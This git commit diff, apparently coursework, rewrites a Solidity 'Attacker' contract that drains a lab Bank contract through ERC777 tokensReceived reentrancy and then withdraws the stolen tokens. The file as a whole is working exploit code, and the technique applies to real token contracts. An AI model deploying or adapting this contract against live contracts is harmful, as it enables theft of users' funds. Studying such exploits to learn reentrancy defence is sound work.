7813c99352e5af7bcc96799250750ed051e4bb99
hong-chu <105093753+hong-chu@users.noreply.github.com>
2024-11-16 22:09:20 -0800

    Add files via upload

--- Attacker.sol
+++ Attacker.sol
@@ -1,3 +1,4 @@
+// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.17;
 
 import "@openzeppelin/contracts/access/AccessControl.sol";
@@ -8,54 +9,64 @@ import "./Bank.sol";
 
 contract Attacker is AccessControl, IERC777Recipient {
     bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
-	IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24); //This is the location of the EIP1820 registry
-	bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient"); //When someone tries to send an ERC777 contract, they check if the recipient implements this interface
-	uint8 depth = 0;
-	uint8 max_depth = 2;
+    IERC1820Registry private _erc1820 = IERC1820Registry(
+        0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
+    ); // EIP1820 registry address
+    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
+    uint8 private depth = 0;
+    uint8 private constant max_depth = 2;
 
-	Bank public bank; 
+    Bank public bank;
 
-	event Deposit(uint256 amount );
-	event Recurse(uint8 depth);
+    event Recurse(uint8 depth);
 
     constructor(address admin) {
         _grantRole(DEFAULT_ADMIN_ROLE, admin);
         _grantRole(ATTACKER_ROLE, admin);
-		_erc1820.setInterfaceImplementer(address(this),TOKENS_RECIPIENT_INTERFACE_HASH,address(this)); //In order to receive ERC777 (like the MCITR tokens used in the attack) you must register with the EIP1820 Registry
+        // Register this contract as an ERC777TokensRecipient
+        _erc1820.setInterfaceImplementer(
+            address(this),
+            TOKENS_RECIPIENT_INTERFACE_HASH,
+            address(this)
+        );
     }
 
-	function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
-		bank = Bank(bank_address);
-        _grantRole(ATTACKER_ROLE, address(this));
-        _grantRole(ATTACKER_ROLE, bank.token.address );
-	}
+    function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
+        bank = Bank(bank_address);
+    }
 
-	/*
-	   The main attack function that should start the reentrancy attack
-	   amt is the amt of ETH the attacker will deposit initially to start the attack
-	*/
-    function attack(uint256 amt) payable public {
+    /*
+        The main attack function that starts the reentrancy attack.
+        'amt' is the amount of ETH to deposit initially.
+    */
+    function attack(uint256 amt) external payable onlyRole(ATTACKER_ROLE) {
         require(address(bank) != address(0), "Target bank not set");
+        require(msg.value >= amt, "Insufficient ETH sent");
+
+        // Deposit ETH to receive tokens
         bank.deposit{value: amt}();
-        bank.claimAll();  // This will trigger tokensReceived
-        // After getting tokens, redeem them for ETH
+
+        // Approve bank to spend our tokens
         ERC777 token = bank.token();
         token.approve(address(bank), token.balanceOf(address(this)));
+
+        // Start reentrancy attack by calling redeem
         bank.redeem(token.balanceOf(address(this)));
     }
 
-	/*
-	   After the attack, this contract has a lot of (stolen) MCITR tokens
-	   This function sends those tokens to the target recipient
-	*/
-	function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
-		ERC777 token = bank.token();
-		token.send(recipient,token.balanceOf(address(this)),"");
-	}
+    /*
+        After the attack, withdraw the stolen tokens to the recipient.
+    */
+    function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
+        ERC777 token = bank.token();
+        uint256 balance = token.balanceOf(address(this));
+        require(balance > 0, "No tokens to withdraw");
+        token.send(recipient, balance, "");
+    }
 
-	/*
-	   This is the function that gets called when the Bank contract sends MCITR tokens
-	*/
+    /*
+        This function is called when the Bank contract sends MCITR tokens.
+    */
     function tokensReceived(
         address operator,
         address from,
@@ -63,22 +74,22 @@ contract Attacker is AccessControl, IERC777Recipient {
         uint256 amount,
         bytes calldata userData,
         bytes calldata operatorData
-    ) external {
+    ) external override {
+        // Ensure the function is called by the expected token contract
+        require(msg.sender == address(bank.token()), "Invalid token sender");
+
         if (depth < max_depth) {
             depth++;
-            bank.deposit{value: address(this).balance}();  // Deposit all available ETH
-            bank.claimAll();  // This will recursively trigger tokensReceived again
-            
-            // After getting tokens, redeem them for ETH
-            if (depth == max_depth) {
-                ERC777 token = bank.token();
-                token.approve(address(bank), token.balanceOf(address(this)));
-                bank.redeem(token.balanceOf(address(this)));
-            }
+
+            // Approve bank to spend our tokens
+            ERC777 token = bank.token();
+            token.approve(address(bank), token.balanceOf(address(this)));
+
+            // Reentrantly call redeem to exploit reentrancy
+            bank.redeem(token.balanceOf(address(this)));
+
+            emit Recurse(depth);
         }
         depth--;
-        emit Recurse(depth);
     }
-
 }
-
